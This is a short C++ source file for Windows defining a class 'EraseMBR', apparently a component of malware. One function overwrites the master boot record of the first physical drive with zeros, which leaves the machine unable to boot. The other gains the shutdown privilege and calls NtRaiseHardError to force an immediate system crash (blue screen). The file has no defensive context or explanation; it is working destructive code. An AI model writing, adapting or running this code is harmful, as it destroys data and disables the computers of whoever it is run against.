#include "erasembr.h"
#include "stdnt.h"

#include <windows.h>

void EraseMBR::Erase(void) {
	DWORD write;
	char mbr[0x200];
	ZeroMemory(&mbr, (sizeof mbr));
	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
			
	if (!WriteFile(MBR, mbr, 0x200, &write, NULL))
		return;
}

void EraseMBR::BSoD(void) {
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
}